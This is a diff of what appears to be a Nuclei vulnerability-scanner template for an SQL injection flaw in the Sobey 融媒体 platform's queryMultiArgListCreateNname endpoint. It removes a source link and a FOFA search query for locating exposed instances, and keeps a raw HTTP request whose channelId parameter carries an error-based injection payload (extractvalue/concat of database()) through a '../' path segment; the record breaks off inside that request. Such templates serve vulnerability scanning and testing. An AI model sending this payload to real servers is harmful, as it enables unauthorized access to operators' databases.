@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体queryMultiArgListCreateNname存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/opd2ykgix1g9zfi2'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: opd2ykgix1g9zfi2
-    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
 http:
 - raw:
   - 'GET /sobey-mchEditor/mch/statistics/js/../queryMultiArgListCreateNname?channelId=1+and+extractvalue%281%2Cconcat%280x7e%2Cdatabase%28%29%29%29&siteCode=1&token=1¶meter=editor HTTP/1.1
